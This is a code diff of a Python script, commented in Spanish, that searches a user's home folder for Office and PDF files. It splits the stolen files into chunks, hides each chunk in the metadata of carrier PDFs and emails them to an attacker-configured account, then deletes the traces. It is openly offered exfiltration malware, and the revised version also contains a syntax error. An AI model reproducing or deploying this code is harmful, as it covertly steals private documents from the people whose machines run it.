@@ -1,30 +1,62 @@
-# Modulos que necesito
-import platform
+""" Modulos que se necesitan """
 import getpass
 import os
+import platform
 import smtplib
+from email import encoders
+from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
 from PyPDF2 import PdfFileReader, PdfFileWriter
-from fpdf import FPDF
 
-# Detectar SO donde esta
-def detect():
+
+
+def _detect():
+    """ Detectar SO donde esta """
     pathuser = []
     if platform.system() == "Linux":
         pathuser.append("Linux")
-        pathuser.append("/home/" + getpass.getuser())
+        pathuser.append("/home/" + getpass.getuser()
     elif platform.system() == "Windows":
         pathuser.append("Windows")
-        pathuser.append("C:/Users/" + getpass.getuser() + "\\OneDrive")
+        pathuser.append("C:/Users/" + getpass.getuser())
     return pathuser
 
 
-# Permite buscar archivos, para Linux por la cabecera y en Windows con la extensión
-def search(tipo):
-    pathuser = detect()
+def _pack(fileExtract):
+    """ Calculo de cantidad de paquetes en que se va dividir cada archvio a extraer """
+    thieffile = os.path.getsize(fileExtract)
+    cant = thieffile // 307200
+    cant = cant + 1
+    return cant
+
+
+def _portadoras(pdfs):
+    """ Genera lista de portadores """
+    porta = []
+    for pdf in pdfs:
+        size = os.path.getsize(pdf)
+        if size < 1024000:
+            porta.append(pdf)
+    if len(porta) != 0:
+        return porta
+    else:
+        pdfcreate = open("Document.pdf", 'wb')
+        creado = PdfFileWriter()
+        creado.insertBlankPage(width=35, height=50, index=1)
+        creado.write(pdfcreate)
+        pathuser = _detect()
+        if pathuser[0] == "Linux":
+            porta.append(os.getcwd() + "/Document.pdf")
+        if pathuser[0] == "Windows":
+            porta.append(os.getcwd() + "\Document.pdf")
+        pdfcreate.close()
+        return porta
+
+
+def _search(tipo):
+    """ Permite buscar archivos, para Linux por la cabecera y en Windows con la extensión """
+    pathuser = _detect()
     lista = []
     log = len(tipo)
     for ruta, direc, files in os.walk(pathuser[1], topdown=True):
@@ -32,10 +64,10 @@ def search(tipo):
             for det in files:
                 vict = ruta + os.sep + det
                 if os.access(vict, os.R_OK) and os.path.isfile(vict):
-                    f = open(vict, "rb")
-                    b = f.read(log)
-                    if b == tipo:
-                        lista.append(vict)
+                    with open(vict, "rb") as f:
+                        b = f.read(log)
+                        if b == tipo:
+                            lista.append(vict)
         elif pathuser[0] == "Windows":
             if tipo[0] == 80:
                 ext = "xlsx"
@@ -46,65 +78,20 @@ def search(tipo):
             for det in files:
                 if det.endswith('.' + ext) or det.endswith('.' + doc):
                     vict = ruta + os.sep + det
-                    f = open(vict, "rb")
-                    b = f.read(log)
-                    if b == tipo:
-                        lista.append(vict)
+                    with open(vict, "rb") as f:
+                        b = f.read(log)
+                        if b == tipo:
+                            lista.append(vict)
     return lista
 
 
-# Calculo de cantidad de paquetes en que se va dividir cada archvio a extraer
-def pack(fileExtract):
-    thieffile = os.path.getsize(fileExtract)
-    cant = thieffile // 307200
-    cant = cant + 1
-    return cant
-
-
-# Carga del paquete en el portador
-def writeMeta(cont, exfilt, cant, doc, carrier):
-    pdfFile = PdfFileReader(open(carrier, 'rb'))
-    writer = PdfFileWriter()
-    writer.appendPagesFromReader(pdfFile)
-    metadata = pdfFile.getDocumentInfo()
-    writer.addMetadata(metadata)
-    # Escribo la metadata:
-    writer.addMetadata({
-        '/Comment': exfilt
-    })
-    # Creo el archivo a enviar
-    usr = getpass.getuser()
-    exfilter = str(doc) + "-th-" + str(usr) + "-ie-" + str(cant) + "-f-" + str(cont) + ".pdf"
-    fout = open(exfilter, 'wb')
-    writer.write(fout)
-    return fout
-
-
-# Genera lista de portadores
-def portadoras(pdfs):
-    porta = []
-    for pdf in pdfs:
-        size = os.path.getsize(pdf)
-        if size < 1024000:
-            porta.append(pdf)
-    if len(porta) != 0 :
-        return porta
-    else:
-        pdfcreate = open("Document.pdf", 'wb')
-        creado = PdfFileWriter()
-        creado.insertBlankPage(width=35, height=50, index=1)
-        creado.write(pdfcreate)
-        porta.append(os.getcwd() + "\Document.pdf")
-        return porta
-
-
-# Envio por correo
-def sender(exfilter, doc, tfiles):
-    fromaddr = "CUENTA DE CORREO PARA ENVIAR"
-    passfrom = "PASSWORD DE ESTA CUENTA"
-    # Colocar una cuenta valida para envio
-    toaddr = "CUENTA DE CORREO DONDE RECIBIR"
-    # Colocar destino de los archivos filtrados
+def _sender(exfilter, doc, tfiles):
+    """ Envio por correo """
+    fromaddr = """ Colocar correo valido para enviar"""
+    passfrom = """ Colocar contraseña de la cuenta para enviar"""
+    """ Colocar una cuenta valida para envio """
+    toaddr = """ Colocar cuanta donde desea que llegue el archivo filtrado"""
+    """ Colocar destino de los archivos filtrados """
     msg = MIMEMultipart()
     msg['From'] = fromaddr
     msg['To'] = toaddr
@@ -122,37 +109,57 @@ def sender(exfilter, doc, tfiles):
     s.login(fromaddr, passfrom)
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
+    attachment.close()
     s.quit()
+
+
+def _writeMeta(cont, exfilt, cant, doc, carrier):
+    """ Carga del paquete en el portador """
+    with open(carrier, 'rb') as carrier_file:
+        pdfFile = PdfFileReader(carrier_file)
+        writer = PdfFileWriter()
+        writer.appendPagesFromReader(pdfFile)
+        metadata = pdfFile.getDocumentInfo()
+        writer.addMetadata(metadata)
+    """ Escribo la metadata: """
+    writer.addMetadata({'/Comment': exfilt})
+    """ Creo el archivo a enviar """
+    usr = getpass.getuser()
+    exfilter = str(doc) + "-th-" + str(usr) + "-ie-" + str(cant) + "-f-" + str(cont) + ".pdf"
+    with open(exfilter, 'wb') as fout:
+        writer.write(fout)
+    return fout
+
 
 
 def main():
     tipo = b'%PDF-1.7'
-    pdfs = search(tipo)
-    carriers = portadoras(pdfs)
+    pdfs = _search(tipo)
+    carriers = _portadoras(pdfs)
     head = b'\x50\x4B\x03\x04\x14'
-    files = search(head)
+    files = _search(head)
     tfiles = len(files)
     usr = getpass.getuser()
     doc = 1
     ncarr = 0
     for fileExtract in files:
-        cant = pack(fileExtract)
+        cant = _pack(fileExtract)
         cont = 0
         while cont < cant:
             inic = 307200 * cont
             if cant != 1:
-                stolenfile = open(fileExtract, 'rb')
-                stolenfile.seek(inic)
-                exfilt = stolenfile.read(307200)
+                with open(fileExtract, 'rb') as stolenfile:
+                    stolenfile.seek(inic)
+                    exfilt = stolenfile.read(307200)
             else:
-                stolenfile = open(fileExtract, 'rb')
-                thieffile = os.path.getsize(fileExtract)
-                exfilt = stolenfile.read(thieffile)
+                with open(fileExtract, 'rb') as stolenfile:
+                    thieffile = os.path.getsize(fileExtract)
+                    exfilt = stolenfile.read(thieffile)
 
             carrier = carriers[ncarr]
-            writeMeta(cont, exfilt, cant, doc, carrier)
+            _writeMeta(cont, exfilt, cant, doc, carrier)
             exfilter = str(doc) + "-th-" + str(usr) + "-ie-" + str(cant) + "-f-" + str(cont) + ".pdf"
-            sender(exfilter, doc, tfiles)
+            _sender(exfilter, doc, tfiles)
             os.remove(exfilter)
             cont = cont + 1
         if len(files) > doc and doc < len(carriers):
